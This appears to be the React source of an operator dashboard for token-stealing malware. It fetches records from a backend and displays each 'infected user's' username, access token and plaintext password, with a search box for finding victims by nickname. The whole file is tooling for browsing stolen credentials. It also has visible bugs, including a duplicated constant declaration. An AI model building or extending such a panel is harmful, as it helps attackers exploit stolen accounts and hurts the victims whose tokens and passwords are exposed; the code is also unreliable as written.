import { useState, useEffect } from 'react';
import axios from 'axios';
import dayjs from 'dayjs';
import config from '../config';

const Tokens = () => {
	const { DOMAIN } = config;
	const url = `${DOMAIN}/api/alpha-int-os-python-testing3`;
	const [tokens, setTokens] = useState([]);
	const [gotTokens, setGotTokens] = useState([]);
	const [search, setSearch] = useState("");
	const [error, setError] = useState([]);
	const { DOMAIN } = config;

	useEffect(() => {
		const fetchTokens = async () => {
			try {
				const res = await axios.get(url, {
					headers: {
						'x-access-token': localStorage.getItem('token')
					}
				});
				setTokens(res.data.data);
				setGotTokens(res.data.data);
			} catch(e) {
				setError(e.response.data.response);
				
			}
		}
		fetchTokens();
	}, []);

	const searchQuery = () => {
		
		const query = search.toLowerCase();
		let d = [];
		gotTokens.forEach(t => {
			const user = t.username.toLowerCase();
			if (user.indexOf(query) !== -1) {
				d.push(t);
			} 
		});
		setTokens(d);
	}

	const changeQuery = e => {
		setSearch(e.target.value);
		searchQuery();
	}
	return (
		<div className="container-tokens">
			<h1>
				<span>T</span>
				okens disponibles
			</h1>
			<input 
				type="text"
				placeholder="Ingresa el nick de un usuario infectado..."
				onChange={changeQuery} 
			/>
			<div className="tokens-box">
				<h2>{error}</h2>
				{
					tokens.map(({token, password, username, userId, date, _id}) => (
						<div className="token-card" key={_id}>
							<div className="token-card-header">
								<h2>{username}</h2>
								<span>{dayjs(date).format("DD/MM/YYYY")}</span>
							</div>
							<div className="token-card-body">
								<p>
									{token}
								</p>
								<p>
									$psw: {password ? password : "Null"}
								</p>
							</div>
						</div>
					))
				}
			</div>
		</div>
	);
}

export default Tokens;